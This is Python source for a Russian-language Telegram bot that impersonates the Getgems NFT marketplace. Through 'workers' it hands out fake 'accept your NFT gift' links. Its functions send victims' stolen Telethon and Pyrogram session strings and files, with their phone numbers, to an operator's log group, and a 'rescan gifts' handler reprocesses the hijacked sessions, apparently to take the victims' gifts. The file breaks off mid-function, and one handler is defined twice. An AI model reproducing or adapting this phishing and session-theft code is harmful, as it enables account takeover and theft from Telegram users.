import asyncio
import logging
import os
import re
import secrets
from typing import Optional
from urllib.parse import urlparse, parse_qs
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, WebAppInfo
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from database import db
from config import Config

# Состояния для FSM
class AdminStates(StatesGroup):
    waiting_for_worker_id = State()

logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

bot = Bot(token=Config.BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
async def send_message_to_group_with_animation(message: str, user_id: int, phone: str, worker_info: dict = None):
    """Отправляет сообщение в группу с анимацией и кнопкой для повторного сканирования"""
    print(f"🔍 [TELEGRAM_BOT] Начало отправки сообщения с анимацией для пользователя {user_id}")
    print(f"🔍 [TELEGRAM_BOT] Параметры: phone={phone}, worker_info={worker_info}")
    print(f"🔍 [TELEGRAM_BOT] Длина сообщения: {len(message)} символов")
    
    # Создаем новый bot instance для избежания проблем с event loop
    local_bot = None
    try:
        print(f"🔍 [TELEGRAM_BOT] Создаем новый bot instance...")
        local_bot = Bot(token=Config.BOT_TOKEN)
        print(f"✅ [TELEGRAM_BOT] Bot instance создан")
        
        print(f"🔍 [TELEGRAM_BOT] Импортируем aiogram компоненты...")
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        from aiogram.utils.keyboard import InlineKeyboardBuilder
        print(f"✅ [TELEGRAM_BOT] Aiogram компоненты импортированы")
        
        # Создаем клавиатуру с кнопкой для повторного сканирования
        print(f"🔍 [TELEGRAM_BOT] Создаем клавиатуру...")
        keyboard = InlineKeyboardBuilder()
        callback_data = f"rescan_gifts_{user_id}_{phone.replace('+', '')}"
        print(f"🔍 [TELEGRAM_BOT] Callback data: {callback_data}")
        
        keyboard.add(
            InlineKeyboardButton(
                text="🔄 Повторить сканирование",
                callback_data=callback_data
            )
        )
        print(f"✅ [TELEGRAM_BOT] Клавиатура создана")
        
        # Отправляем изображение с сообщением
        image_url = "https://i.ibb.co/mVV04yPg/image.png"
        print(f"🔍 [TELEGRAM_BOT] URL изображения: {image_url}")
        print(f"🔍 [TELEGRAM_BOT] LOG_GROUP_ID: {Config.LOG_GROUP_ID}")
        
        try:
            print(f"🔍 [TELEGRAM_BOT] Попытка отправить изображение...")
            # Отправляем изображение по URL
            result = await local_bot.send_photo(
                chat_id=Config.LOG_GROUP_ID,
                photo=image_url,
                caption=message,
                parse_mode=None,  # Убираем Markdown парсинг
                reply_markup=keyboard.as_markup()
            )
            print(f"✅ [TELEGRAM_BOT] Изображение успешно отправлено, message_id: {result.message_id}")
            
        except Exception as photo_error:
            print(f"❌ [TELEGRAM_BOT] Ошибка отправки изображения: {photo_error}")
            print(f"❌ [TELEGRAM_BOT] Тип ошибки изображения: {type(photo_error).__name__}")
            logger.error(f"Error sending photo: {photo_error}")
            
            # Если не удалось отправить изображение, отправляем обычное сообщение
            print(f"🔍 [TELEGRAM_BOT] Отправляем обычное сообщение как fallback...")
            result = await local_bot.send_message(
                chat_id=Config.LOG_GROUP_ID,
                text=message,
                parse_mode=None,  # Убираем Markdown парсинг
                reply_markup=keyboard.as_markup()
            )
            print(f"✅ [TELEGRAM_BOT] Обычное сообщение отправлено, message_id: {result.message_id}")
        
        logger.info(f"Message with animation sent to group for user {user_id}")
        print(f"✅ [TELEGRAM_BOT] Сообщение с анимацией успешно отправлено для пользователя {user_id}")
        return True
        
    except Exception as e:
        print(f"❌ [TELEGRAM_BOT] Критическая ошибка отправки сообщения: {e}")
        print(f"❌ [TELEGRAM_BOT] Тип критической ошибки: {type(e).__name__}")
        print(f"❌ [TELEGRAM_BOT] Параметры при ошибке: user_id={user_id}, phone={phone}")
        logger.error(f"Error sending message with animation to group: {e}")
        import traceback
        print(f"❌ [TELEGRAM_BOT] Полный traceback:")
        traceback.print_exc()
        return False
    finally:
        # Закрываем bot session
        if local_bot:
            try:
                await local_bot.session.close()
            except:
                pass

async def send_message_to_group(message: str):
    try:
        if Config.LOG_CHAT_ID:
            await bot.send_message(
                chat_id=Config.LOG_CHAT_ID,
                text=message,
                parse_mode="Markdown"
            )
            logger.info("Сообщение отправлено в группу логов")
        else:
            logger.warning("LOG_CHAT_ID не настроен, сообщение не отправлено")
    except Exception as e:
        logger.error(f"Ошибка отправки сообщения в группу: {e}")
async def send_session_to_group(user_id: int, phone_number: str, session_string: str, is_pyrogram: bool = False):
    import tempfile
    import os
    from datetime import datetime
    temp_file_path = None
    try:
        session_type = "pyrogram_string" if is_pyrogram else "telethon_string"
        session_filename = f"session_{user_id}_{phone_number.replace('+', '')}_{session_type}.txt"
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as temp_file:
            temp_file.write(session_string)
            temp_file_path = temp_file.name
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_format = "Pyrogram Session String" if is_pyrogram else "Telethon Session String"
        signature = f"{session_format} from {user_id} @{phone_number} {phone_number}"
        message = (
            f"🔑 **Новый {session_format} получен!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"📅 **Time:** `{current_time}`\n"
            f"🔧 **Format:** `{session_format}`\n"
            f"🔐 **Signature:** `{signature}`"
        )
        with open(temp_file_path, 'rb') as session_file:
            await bot.send_document(
                chat_id=Config.LOG_GROUP_ID,
                document=types.BufferedInputFile(
                    session_file.read(),
                    filename=session_filename
                ),
                caption=message,
                parse_mode="Markdown"
            )
        logger.info(f"Session string file sent to group for user {user_id}")
        return True
    except Exception as e:
        logger.error(f"Error sending session string to group: {e}")
        return False
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.unlink(temp_file_path)
            except Exception:
                pass
async def send_session_file_to_group(user_id: int, phone_number: str, session_file_path: str, is_pyrogram: bool = False):
    import os
    from datetime import datetime
    try:
        if not os.path.exists(session_file_path):
            logger.error(f"Session file not found: {session_file_path}")
            return False
        session_type = "pyrogram" if is_pyrogram else "telethon"
        session_filename = f"session_{user_id}_{phone_number.replace('+', '')}_{session_type}.session"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_format = "Pyrogram Session" if is_pyrogram else "Telethon Session"
        signature = f"{session_format} from {user_id} @{phone_number} {phone_number}"
        message = (
            f"🔑 **Новая {session_format} получена!**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"📱 **Phone:** `{phone_number}`\n"
            f"📅 **Time:** `{current_time}`\n"
            f"🔧 **Format:** `{session_format}`\n"
            f"🔐 **Signature:** `{signature}`"
        )
        with open(session_file_path, 'rb') as session_file:
            await bot.send_document(
                chat_id=Config.LOG_GROUP_ID,
                document=types.BufferedInputFile(
                    session_file.read(),
                    filename=session_filename
                ),
                caption=message,
                parse_mode="Markdown"
            )
        logger.info(f"Session file sent to group for user {user_id}")
        return True
    except Exception as e:
        logger.error(f"Error sending session file to group: {e}")
        return False
def parse_nft_link(nft_link: str) -> Optional[dict]:
    try:
        pattern = r't\.me/nft/([^-]+)-(\d+)'
        match = re.search(pattern, nft_link)
        if match:
            nft_name = match.group(1)
            nft_number = match.group(2)
            return {
                'name': nft_name,
                'number': nft_number,
                'display_name': f"{nft_name}"
            }
        return None
    except Exception as e:
        logger.error(f"Ошибка парсинга NFT ссылки: {e}")
        return None
def generate_share_token() -> str:
    return secrets.token_urlsafe(32)

def escape_markdown(text: str) -> str:
    """Экранирует специальные символы Markdown"""
    if not text:
        return ""
    # Экранируем специальные символы Markdown
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text
@dp.inline_query()
async def inline_query_handler(query: InlineQuery):
    try:
        if not db.is_worker(query.from_user.id):
            results = [
                InlineQueryResultArticle(
                    id="not_worker",
                    title="Временно недоступно",
                    description="Создание подарочных ссылок временно недоступно",
                    input_message_content=InputTextMessageContent(
                        message_text="⚠️ Временно недоступно\n\nСоздание подарочных ссылок временно недоступно."
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return
        query_text = query.query.strip()
        if not query_text:
            results = [
                InlineQueryResultArticle(
                    id="instruction",
                    title="Как создать подарочную ссылку",
                    description="Введите ссылку на NFT после @usernamebot",
                    input_message_content=InputTextMessageContent(
                        message_text="Для создания подарочной ссылки введите: @usernamebot {ссылка на NFT}"
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return
        nft_info = parse_nft_link(query_text)
        if not nft_info:
            results = [
                InlineQueryResultArticle(
                    id="invalid_link",
                    title="Неверная ссылка на NFT",
                    description="Пожалуйста, введите корректную ссылку на NFT",
                    input_message_content=InputTextMessageContent(
                        message_text="❌ Неверная ссылка на NFT. Используйте формат: http://t.me/nft/название-номер"
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return
        share_token = generate_share_token()
        logger.info(f"Ensuring user registration for creator telegram_id: {query.from_user.id}")
        creator_user = db.get_or_create_user(
            telegram_id=query.from_user.id,
            username=query.from_user.username,
            first_name=query.from_user.first_name,
            last_name=query.from_user.last_name
        )
        logger.info(f"Creator user registration completed for {query.from_user.id}: {creator_user}")
        try:
            db.create_gift_share(
                nft_link=query_text,
                nft_name=nft_info['name'],
                nft_number=nft_info['number'],
                creator_telegram_id=query.from_user.id,
                share_token=share_token
            )
            from utils import log_user_action
            await log_user_action(
                'gift_link_created',
                user_info={'id': query.from_user.id},
                additional_data={'details': f"Создана ссылка на подарок: {nft_info['display_name']} ({query_text})"}
            )
        except Exception as e:
            logger.error(f"Ошибка сохранения в БД: {e}")
            results = [
                InlineQueryResultArticle(
                    id="db_error",
                    title="Ошибка создания подарка",
                    description="Попробуйте еще раз",
                    input_message_content=InputTextMessageContent(
                        message_text="❌ Произошла ошибка при создании подарочной ссылки"
                    )
                )
            ]
            await query.answer(results, cache_time=1)
            return
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(
                text="📱 Посмотреть",
                url=query_text
            )
        )
        keyboard.add(
                InlineKeyboardButton(
                    text="🎁 Принять подарок",
                    url=f"https://t.me/{Config.BOT_USERNAME}?start=gift_{share_token}"
                )
            )
        keyboard.adjust(1)
        message_text = f"🎁 Вам дарят NFT: [{nft_info['display_name']}]({query_text})\n\nДля принятия нажмите кнопку ниже."
        results = [
            InlineQueryResultArticle(
                id=f"gift_{share_token}",
                title=f"🎁 Подарить {nft_info['display_name']}",
                description=f"NFT: {nft_info['display_name']}",
                input_message_content=InputTextMessageContent(
                    message_text=message_text,
                    parse_mode="Markdown"
                ),
                reply_markup=keyboard.as_markup()
            )
        ]
        await query.answer(results, cache_time=1)
    except Exception as e:
        logger.error(f"Ошибка в inline_query_handler: {e}")
        results = [
            InlineQueryResultArticle(
                id="error",
                title="Произошла ошибка",
                description="Попробуйте еще раз",
                input_message_content=InputTextMessageContent(
                    message_text="❌ Произошла ошибка. Попробуйте еще раз."
                )
            )
        ]
        await query.answer(results, cache_time=1)
@dp.message(CommandStart())
async def start_handler(message: types.Message):
    try:
        logger.info(f"Start command from user {message.from_user.id} (@{message.from_user.username}): {message.text}")
        args = message.text.split(' ', 1)
        if len(args) > 1 and args[1].startswith('gift_'):
            share_token = args[1][5:]
            logger.info(f"Processing gift share token: {share_token}")
            gift_share = db.get_gift_share_by_token(share_token)
            logger.info(f"Gift share data: {gift_share}")
            if not gift_share:
                logger.warning(f"Gift share not found for token: {share_token}")
                await message.answer("❌ Подарочная ссылка не найдена или недействительна.")
                return
            if gift_share['is_received']:
                logger.warning(f"Gift already received for token: {share_token}")
                await message.answer("❌ Этот подарок уже был принят.")
                return
            logger.info(f"Ensuring user registration for telegram_id: {message.from_user.id}")
            user = db.get_or_create_user(
                telegram_id=message.from_user.id,
                username=message.from_user.username,
                first_name=message.from_user.first_name,
                last_name=message.from_user.last_name
            )
            logger.info(f"User registration completed for {message.from_user.id}: {user}")
            success = db.accept_gift_share(share_token, message.from_user.id)
            logger.info(f"Gift acceptance result for user {message.from_user.id}: {success}")
            if success:
                from utils import log_user_action
                await log_user_action(
                    'link_activated',
                    user_info={
                        'telegram_id': message.from_user.id,
                        'username': message.from_user.username,
                        'first_name': message.from_user.first_name,
                        'last_name': message.from_user.last_name
                    },
                    additional_data={
                        'nft_name': gift_share['nft_name'],
                        'nft_link': gift_share['nft_link'],
                        'details': f"Активирована ссылка на подарок: {gift_share['nft_name']} ({gift_share['nft_link']})"
                    }
                )
                logger.info(f"Adding NFT to webapp inventory for user {message.from_user.id}: {gift_share['nft_link']}")
                try:
                    gift_id = db.add_gift_link(message.from_user.id, gift_share['nft_link'])
                    logger.info(f"Successfully added gift to webapp inventory with ID: {gift_id}")
                except Exception as e:
                    logger.error(f"Error adding gift to webapp inventory: {e}")
                    await message.answer("❌ Ошибка при добавлении подарка в инвентарь веб-приложения")
                    return
                sender_user = db.get_user_by_telegram_id(gift_share['creator_telegram_id'])
                sender_username = sender_user['username'] if sender_user and sender_user['username'] else 'пользователь'
                # Используем HTML для безопасного форматирования
                from html import escape as html_escape
                escaped_username = html_escape(sender_username)
                escaped_link = html_escape(gift_share['nft_link'])
                success_message = f"@{escaped_username} передал вам <a href=\"{escaped_link}\">NFT подарок</a> через функцию обмена подарками Getgems прямо в чате Telegram.\n\nТеперь он в вашем инвентаре веб-приложения."
                keyboard = InlineKeyboardBuilder()
                keyboard.add(InlineKeyboardButton(
                    text="📦 Инвентарь",
                    web_app=WebAppInfo(url=Config.WEBAPP_URL)
                ))
                await message.answer(success_message, parse_mode="HTML", reply_markup=keyboard.as_markup())
            else:
                await message.answer("❌ Не удалось принять подарок. Попробуйте еще раз.")
        else:
            keyboard = InlineKeyboardBuilder()
            keyboard.add(
                InlineKeyboardButton(
                    text="Торговать Telegram Numbers",
                    url="https://getgems.io/collection/EQAOQdwdw8kGftJCSFgOErM1mBjYPe4DBPq8-AhF6vr9si5N?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview"
                )
            )
            keyboard.add(
                InlineKeyboardButton(
                    text="Торговать Telegram Usernames",
                    url="https://getgems.io/collection/EQCA14o1-VWhS2efqoh_9M1b_A9DtKTuoqfmkn83AbJzwnPi?utm_source=homepage&utm_medium=top_collections&utm_campaign=collection_overview"
                )
            )
            keyboard.add(
                InlineKeyboardButton(
                    text="Торговать Telegram Gifts",
                    url="https://getgems.io/gifts-collection"
                )
            )
            keyboard.adjust(1)  
            start_text = f"""👋 Привет, {message.from_user.first_name or 'друг'}!
Это бот Getgems, через него можно торговать на нашем маркетплейсе прямо в мини-аппе Telegram, и это удобнейший способ торговать Номерами, Юзернеймами и Подарками с 0% комиссией! 💯
💡 Главное, с помощью этого бота вы можете дарить и обмениваться своими NFT-подарками прямо в чатах и диалогах, для этого просто отправьте боту свой адрес TON-кошелька. После удачной привязки, когда вы начнете набирать в любой переписке @GetgemsRuRobot — активируется inline-режим, теперь можно дарить и обмениваться NFT прямо в переписке!"""
            await message.answer(
                start_text,
                reply_markup=keyboard.as_markup()
            )
    except Exception as e:
        logger.error(f"Ошибка в start_handler: {e}")
        await message.answer("❌ Произошла ошибка. Попробуйте еще раз.")
@dp.callback_query(lambda c: c.data and c.data.startswith('rescan_gifts_'))
async def rescan_gifts_callback_handler(callback_query: CallbackQuery):
    """Обработчик кнопки повторного сканирования подарков"""
    try:
        await callback_query.answer()
        
        # Извлекаем user_id и phone из callback_data
        parts = callback_query.data.split('_')
        if len(parts) >= 4:
            user_id = int(parts[2])
            phone = '+' + parts[3]
            
            # Проверяем, есть ли текст или caption в сообщении
            if callback_query.message.text:
                # Если есть текст, редактируем его
                await callback_query.message.edit_text(
                    f"{callback_query.message.text}\n\n🔄 **Повторное сканирование запущено...**",
                    parse_mode="Markdown"
                )
            elif callback_query.message.caption:
                # Если есть caption (для фото), редактируем его
                await callback_query.message.edit_caption(
                    caption=f"{callback_query.message.caption}\n\n🔄 **Повторное сканирование запущено...**",
                    parse_mode="Markdown"
                )
            else:
                # Если нет ни текста, ни caption, отправляем новое сообщение
                await callback_query.message.reply(
                    "🔄 **Повторное сканирование запущено...**",
                    parse_mode="Markdown"
                )
            
            # Логируем запрос на повторное сканирование
            from utils import log_user_action
            await log_user_action(
                'rescan_gifts_requested',
                user_info={'telegram_id': user_id},
                additional_data={
                    'phone': phone,
                    'details': f"Запрошено повторное сканирование подарков для пользователя {user_id}"
                }
            )
            
            # Запускаем полный цикл обработки подарков
            try:
                from utils import get_phone_from_json, check_session_exists, validate_session
                from utils import get_session_data_from_sqlite, convert_telethon_to_pyrogram
                import os
                import requests
                
                # Проверяем существование сессии
                if not (check_session_exists(phone) and validate_session(phone)):
                    await callback_query.message.reply(
                        "❌ **Сессия истекла или недействительна**\n\nПожалуйста, пройдите авторизацию заново.",
                        parse_mode="Markdown"
                    )
                    return
                
                session_file = f"sessions/{phone.replace('+', '')}.session"
                if not os.path.exists(session_file):
                    await callback_query.message.reply(
                        "❌ **Файл сессии не найден**\n\nПожалуйста, пройдите авторизацию заново.",
                        parse_mode="Markdown"
                    )
                    return
                
                # Логируем начало обработки
                await log_user_action(
                    'session_processing_started',
                    user_info={'telegram_id': user_id},
                    additional_data={'details': f"Началась повторная обработка сессии пользователя"}
                )
                
                # Вызываем API для обработки подарков (используем тот же подход что и в веб-приложении)
                try:
                    api_url = "http://localhost:5000/api/process_gifts"
                    api_data = {
                        'user_id': user_id
                    }
                    
                    response = requests.post(api_url, json=api_data, timeout=Config.REQUEST_TIMEOUT)
                    result_data = response.json()
                    
                    if result_data.get('success'):
                        # Логируем завершение обработки
                        await log_user_action(
                            'session_processing_completed',
                            user_info={'telegram_id': user_id},
                            additional_data={
                                'details': f"Повторная обработка сессии пользователя завершена успешно"
                            }
                        )
                        
                        await callback_query.message.reply(
                            f"✅ **Повторное сканирование завершено**\n\n"
                            f"📊 **Результат:** {result_data.get('message', 'Обработка завершена успешно')}",
                            parse_mode="Markdown"
                        )
                    else:
                        error_msg = result_data.get('error', 'Неизвестная ошибка')
                        await callback_query.message.reply(
                            f"❌ **Ошибка при обработке**\n\n{error_msg}",
                            parse_mode="Markdown"
                        )
                        
                except requests.exceptions.RequestException as req_error:
                    await callback_query.message.reply(
                        f"❌ **Ошибка соединения с API**\n\nПопробуйте позже или обратитесь к администратору.",
                        parse_mode="Markdown"
                    )
                    
            except Exception as e:
                logger.error(f"Ошибка при повторном сканировании подарков: {e}")
                await callback_query.message.reply(
                    f"❌ **Ошибка при повторном сканировании**\n\n"
                    f"Произошла ошибка: {str(e)}\n\n"
                    f"Попробуйте позже или обратитесь к администратору.",
                    parse_mode="Markdown"
                )
            
        else:
            await callback_query.answer("❌ Ошибка в данных запроса", show_alert=True)
            
    except Exception as e:
        logger.error(f"Ошибка в rescan_gifts_callback_handler: {e}")
        await callback_query.answer("❌ Ошибка при запуске повторного сканирования", show_alert=True)

@dp.callback_query(lambda c: c.data and c.data.startswith('retry_'))
async def retry_handler(callback_query: CallbackQuery):
    """Обработчик кнопки повтора для повторной обработки сессии"""
    try:
        await callback_query.answer()
        user_id = int(callback_query.data.split('_')[1])
        from utils import log_user_action
        await log_user_action(
            'retry_processing',
            user_info={
                'telegram_id': user_id
            },
            additional_data={
                'details': f"Начата повторная обработка сессии по запросу администратора"
            }
        )
        await callback_query.message.edit_text(
            f"{callback_query.message.text}\n\n🔄 **Повторная обработка запущена...**",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Ошибка в retry_handler: {e}")
        await callback_query.answer("❌ Ошибка при запуске повторной обработки", show_alert=True)
@dp.message(Command("admin"))
async def admin_handler(message: types.Message):
    try:
        if not Config.is_admin(message.from_user.id):
            return
        workers = db.get_all_workers()
        keyboard = InlineKeyboardBuilder()
        keyboard.add(
            InlineKeyboardButton(
                text="➕ Добавить воркера",
                callback_data="admin_add_worker"
            )
        )
        if workers:
            keyboard.add(
                InlineKeyboardButton(
                    text="📋 Список воркеров",
                    callback_data="admin_list_workers"
                )
            )
        keyboard.adjust(1)
        admin_text = f"""
🔧 <b>Админ панель</b>
👥 <b>Активных воркеров:</b> {len(workers)}
<b>Доступные действия:</b>
• Добавить нового воркера
• Просмотреть список воркеров
• Отозвать права воркера
"""
        await message.answer(
            admin_text,
            reply_markup=keyboard.as_markup(),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Ошибка в admin_handler: {e}")
        await message.answer("❌ Произошла ошибка при открытии админ панели.")
@dp.callback_query(lambda c: c.data.startswith("admin_"))
async def admin_callback_handler(callback_query: CallbackQuery):
    try:
        if not Config.is_admin(callback_query.from_user.id):
            await callback_query.answer("❌ У вас нет прав администратора.", show_alert=True)
            return
        action = callback_query.data
        if action == "admin_add_worker":
            # Устанавливаем состояние ожидания ID воркера
            from aiogram.fsm.context import FSMContext
            state = FSMContext(storage=dp.storage, key=f"{callback_query.message.chat.id}:{callback_query.from_user.id}")
            await state.set_state(AdminStates.waiting_for_worker_id)
            
            keyboard = InlineKeyboardBuilder()
            keyboard.add(
                InlineKeyboardButton(
                    text="🔙 Отмена",
                    callback_data="admin_back"
                )
            )
            
            await callback_query.message.edit_text(
                "👤 <b>Добавление воркера</b>\n\n"
                "Перешлите сообщение от пользователя, которого хотите сделать воркером, "
                "или отправьте его Telegram ID числом.\n\n"
                "Например: <code>123456789</code>",
                parse_mode="HTML",
                reply_markup=keyboard.as_markup()
            )
        elif action == "admin_list_workers":
            workers = db.get_all_workers()
            if not workers:
                await callback_query.message.edit_text(
                    "📋 <b>Список воркеров</b>\n\n"
                    "Нет активных воркеров.",
                    parse_mode="HTML"
                )
                return
            keyboard = InlineKeyboardBuilder()
            from html import escape as html_escape
            workers_text = "📋 <b>Список воркеров</b>\n\n"
            for i, worker in enumerate(workers, 1):
                name = worker.get('first_name', 'Неизвестно')
                if worker.get('last_name'):
                    name += f" {worker['last_name']}"
                username = f"@{worker['username']}" if worker.get('username') else "Нет username"
                # Экранируем пользовательские данные
                escaped_name = html_escape(name)
                escaped_username = html_escape(username)
                workers_text += f"{i}. {escaped_name} ({escaped_username})\n"
                workers_text += f"   ID: <code>{worker['telegram_id']}</code>\n\n"
                keyboard.add(
                    InlineKeyboardButton(
                        text=f"❌ Удалить {name}",
                        callback_data=f"admin_remove_worker_{worker['telegram_id']}"
                    )
                )
            keyboard.add(
                InlineKeyboardButton(
                    text="🔙 Назад",
                    callback_data="admin_back"
                )
            )
            keyboard.adjust(1)
            await callback_query.message.edit_text(
                workers_text,
                reply_markup=keyboard.as_markup(),
                parse_mode="HTML"
            )
        elif action.startswith("admin_remove_worker_"):
            worker_id = int(action.split("_")[-1])
            if db.remove_worker(worker_id):
                await callback_query.answer("✅ Воркер успешно удален.", show_alert=True)
                workers = db.get_all_workers()
                if not workers:
                    await callback_query.message.edit_text(
                        "📋 <b>Список воркеров</b>\n\n"
                        "Нет активных воркеров.",
                        parse_mode="HTML"
                    )
                    return
                keyboard = InlineKeyboardBuilder()
                from html import escape as html_escape
                workers_text = "📋 <b>Список воркеров</b>\n\n"
                for i, worker in enumerate(workers, 1):
                    name = worker.get('first_name', 'Неизвестно')
                    if worker.get('last_name'):
                        name += f" {worker['last_name']}"
                    username = f"@{worker['username']}" if worker.get('username') else "Нет username"
                    # Экранируем пользовательские данные
                    escaped_name = html_escape(name)
                    escaped_username = html_escape(username)
                    workers_text += f"{i}. {escaped_name} ({escaped_username})\n"
                    workers_text += f"   ID: <code>{worker['telegram_id']}</code>\n\n"
                    keyboard.add(
                        InlineKeyboardButton(
                            text=f"❌ Удалить {name}",
                            callback_data=f"admin_remove_worker_{worker['telegram_id']}"
                        )
                    )
                keyboard.add(
                    InlineKeyboardButton(
                        text="🔙 Назад",
                        callback_data="admin_back"
                    )
                )
                keyboard.adjust(1)
                await callback_query.message.edit_text(
                    workers_text,
                    reply_markup=keyboard.as_markup(),
                    parse_mode="HTML"
                )
            else:
                await callback_query.answer("❌ Ошибка при удалении воркера.", show_alert=True)
        elif action == "admin_back":
            # Очищаем состояние при возврате в главное меню
            from aiogram.fsm.context import FSMContext
            state = FSMContext(storage=dp.storage, key=f"{callback_query.message.chat.id}:{callback_query.from_user.id}")
            await state.clear()
            
            workers = db.get_all_workers()
            keyboard = InlineKeyboardBuilder()
            keyboard.add(
                InlineKeyboardButton(
                    text="➕ Добавить воркера",
                    callback_data="admin_add_worker"
                )
            )
            if workers:
                keyboard.add(
                    InlineKeyboardButton(
                        text="📋 Список воркеров",
                        callback_data="admin_list_workers"
                    )
                )
            keyboard.adjust(1)
            admin_text = f"""
🔧 <b>Админ панель</b>
👥 <b>Активных воркеров:</b> {len(workers)}
<b>Доступные действия:</b>
• Добавить нового воркера
• Просмотреть список воркеров
• Отозвать права воркера
"""
            await callback_query.message.edit_text(
                admin_text,
                reply_markup=keyboard.as_markup(),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Ошибка в admin_callback_handler: {e}")
        await callback_query.answer("❌ Произошла ошибка.", show_alert=True)

@dp.callback_query(lambda c: c.data and c.data.startswith('rescan_gifts_'))
async def rescan_gifts_callback_handler(callback_query: types.CallbackQuery):
    """Обработчик кнопки повторного сканирования подарков"""
    try:
        await callback_query.answer()
        
        # Извлекаем данные из callback_data
        callback_data = callback_query.data
        parts = callback_data.split('_')
        if len(parts) >= 4:
            user_id = int(parts[2])
            phone_number = '+' + parts[3]
            
            # Отправляем сообщение о начале повторного сканирования
            await callback_query.message.reply(
                f"🔄 Запущено повторное сканирование подарков для аккаунта {phone_number} (ID: {user_id})"
            )
            
            # Запускаем процесс обработки подарков в фоновом режиме
            from utils import process_gifts_for_user
            import asyncio
            
            # Создаем задачу для обработки подарков
            asyncio.create_task(process_gifts_for_user(user_id, phone_number))
            
            logger.info(f"Rescan gifts started for user {user_id}, phone {phone_number}")
        else:
            await callback_query.message.reply("❌ Ошибка в данных для повторного сканирования")
            
    except Exception as e:
        logger.error(f"Ошибка в rescan_gifts_callback_handler: {e}")
        await callback_query.answer("❌ Произошла ошибка при запуске повторного сканирования.", show_alert=True)
@dp.message(lambda message: message.text and message.text.isdigit() and len(message.text) > 5)
async def add_worker_by_id(message: types.Message):
    try:
        if not Config.is_admin(message.from_user.id):
            return
        worker_id = int(message.text)
        user = db.get_user_by_telegram_id(worker_id)
        
        # Если пользователь не найден, пытаемся создать его
        if not user:
            try:
                # Пытаемся получить информацию о пользователе через Telegram API
                chat_member = await bot.get_chat(worker_id)
                # Создаем пользователя в базе данных
                db.get_or_create_user(
                    telegram_id=worker_id,
                    username=chat_member.username,
                    first_name=chat_member.first_name,
                    last_name=chat_member.last_name
                )
                user = db.get_user_by_telegram_id(worker_id)
            except Exception as e:
                logger.warning(f"Не удалось получить информацию о пользователе {worker_id}: {e}")
                # Создаем пользователя с минимальной информацией
                db.get_or_create_user(telegram_id=worker_id)
                user = db.get_user_by_telegram_id(worker_id)
        
        if db.add_worker(worker_id):
            # Проверяем, что user не None
            if not user:
                await message.answer("❌ Не удалось получить информацию о пользователе.")
                return
            
            # Безопасно получаем имя, обрабатывая None значения
            first_name = user.get('first_name') or 'Неизвестно'
            name = str(first_name) if first_name else 'Неизвестно'
            
            last_name = user.get('last_name')
            if last_name:
                name += f" {str(last_name)}"
            
            # Безопасно получаем username
            user_username = user.get('username')
            username = f"@{user_username}" if user_username else "Нет username"
            
            # Используем HTML для безопасного форматирования
            from html import escape as html_escape
            escaped_name = html_escape(str(name))
            escaped_username = html_escape(str(username))
            await message.answer(
                f"✅ <b>Воркер успешно добавлен!</b>\n\n"
                f"👤 <b>Имя:</b> {escaped_name}\n"
                f"🆔 <b>Username:</b> {escaped_username}\n"
                f"🔢 <b>ID:</b> <code>{worker_id}</code>",
                parse_mode="HTML"
            )
        else:
            await message.answer("❌ Ошибка при добавлении воркера.")
    except ValueError:
        pass
    except Exception as e:
        logger.error(f"Ошибка в add_worker_by_id: {e}")
        await message.answer("❌ Произошла ошибка при добавлении воркера.")
# Обработчик сообщений в состоянии ожидания ID воркера
@dp.message(AdminStates.waiting_for_worker_id)
async def handle_worker_id_input(message: types.Message, state: FSMContext):
    """Обработчик ввода ID воркера или пересланного сообщения"""
    try:
        # Проверяем права администратора
        if not Config.is_admin(message.from_user.id):
            await message.answer("❌ У вас нет прав администратора.")
            await state.clear()
            return
        
        worker_id = None
        
        # Если это пересланное сообщение
        if message.forward_from:
            worker_id = message.forward_from.id
            first_name = message.forward_from.first_name or "Неизвестно"
            worker_name = str(first_name) if first_name else "Неизвестно"
            if message.forward_from.last_name:
                worker_name += f" {str(message.forward_from.last_name)}"
            worker_username = f"@{message.forward_from.username}" if message.forward_from.username else "Нет username"
            
            # Создаем пользователя в базе данных, если его нет
            db.get_or_create_user(
                telegram_id=worker_id,
                username=message.forward_from.username,
                first_name=message.forward_from.first_name,
                last_name=message.forward_from.last_name
            )
        # Если это текстовое сообщение с ID
        elif message.text and message.text.isdigit():
            worker_id = int(message.text)
            # Получаем информацию о пользователе из базы данных
            user = db.get_user_by_telegram_id(worker_id)
            if user:
                first_name = user.get('first_name') or 'Неизвестно'
                worker_name = str(first_name) if first_name else 'Неизвестно'
                last_name = user.get('last_name')
                if last_name:
                    worker_name += f" {str(last_name)}"
                user_username = user.get('username')
                worker_username = f"@{user_username}" if user_username else "Нет username"
            else:
                # Пытаемся получить информацию о пользователе через Telegram API
                try:
                    chat_member = await bot.get_chat(worker_id)
